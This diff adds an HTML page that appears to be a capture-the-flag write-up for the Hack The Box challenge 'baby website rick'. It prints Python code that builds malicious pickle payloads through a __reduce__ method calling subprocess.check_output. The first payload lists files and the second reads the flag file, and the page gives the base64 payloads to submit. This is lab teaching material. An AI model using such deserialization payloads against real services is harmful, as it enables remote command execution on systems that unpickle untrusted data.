@@ -1,0 +1,86 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+    <title>baby website rick</title>
+    <link rel="stylesheet" href="../../pages.css" />
+  </head>
+  <body>
+    <div class="container">
+      <h1>
+        Hack The Box |
+        <a href="https://app.hackthebox.com/challenges/185" target="_blank"
+          >baby website rick</a
+        >
+      </h1>
+      <p>IP: <strong>94.237.63.201:46248</strong></p>
+
+      <p>
+        Watch the video tutorial:
+        <a href="https://www.youtube.com/watch?v=jz3TaU0ZuRQ" target="_blank"
+          >Tutorial Video</a
+        >
+      </p>
+
+      <img src="image.png" alt="Image 1" />
+
+      <img src="image 2.png" alt="Image 2" />
+
+      <p>This is base64 encoded:</p>
+
+      <img src="image 3.png" alt="Image 3" />
+
+      <pre><code class="code">
+import subprocess
+import pickle
+import base64
+import pickletools
+
+class anti_pickle_serum(object):
+  def __init__(self):
+    pass
+
+  def __reduce__(self):
+    cmd = ('ls')
+    return subprocess.check_output, ([cmd],)
+original_pickle = base64.b64decode('KGRwMApTJ3NlcnVtJwpwMQpjY29weV9yZWcKX3JlY29uc3RydWN0b3IKcDIKKGNfX21haW5fXwphbnRpX3BpY2tsZV9zZXJ1bQpwMwpjX19idWlsdGluX18Kb2JqZWN0CnA0Ck50cDUKUnA2CnMu')
+serum = pickle.dumps({'serum': anti_pickle_serum()}, protocol=0)
+
+print(base64.b64encode(serum))
+  </code></pre>
+
+      <p>Run the code in Python 2, the above code will give:</p>
+      <pre><code class="code">KGRwMApTJ3NlcnVtJwpwMQpjc3VicHJvY2VzcwpjaGVja19vdXRwdXQKcDIKKChscDMKUydscycKcDQKYXRwNQpScDYKcy4=
+  </code></pre>
+
+      <img src="image 4.png" alt="Image 4" />
+
+      <p>Import the following code:</p>
+
+      <pre><code class="code">
+import subprocess
+import pickle
+import base64
+import pickletools
+
+class anti_pickle_serum(object):
+  def __init__(self):
+    pass
+
+  def __reduce__(self):
+    cmd = ['cat', 'flag_wIp1b']
+    return subprocess.check_output, (cmd,)
+original_pickle = base64.b64decode('KGRwMApTJ3NlcnVtJwpwMQpjY29weV9yZWcKX3JlY29uc3RydWN0b3IKcDIKKGNfX21haW5fXwphbnRpX3BpY2tsZV9zZXJ1bQpwMwpjX19idWlsdGluX18Kb2JqZWN0CnA0Ck50cDUKUnA2CnMu')
+serum = pickle.dumps({'serum': anti_pickle_serum()}, protocol=0)
+
+print(base64.b64encode(serum))
+  </code></pre>
+
+      <p>The above code will give:</p>
+      <pre><code class="code">KGRwMApTJ3NlcnVtJwpwMQpjc3VicHJvY2VzcwpjaGVja19vdXRwdXQKcDIKKChscDMKUydjYXQnCnA0CmFTJ2ZsYWdfd0lwMWInCnA1CmF0cDYKUnA3CnMu
+  </code></pre>
+
+      <img src="image 5.png" alt="Image 5" />
+    </div>
+  </body>
+</html>
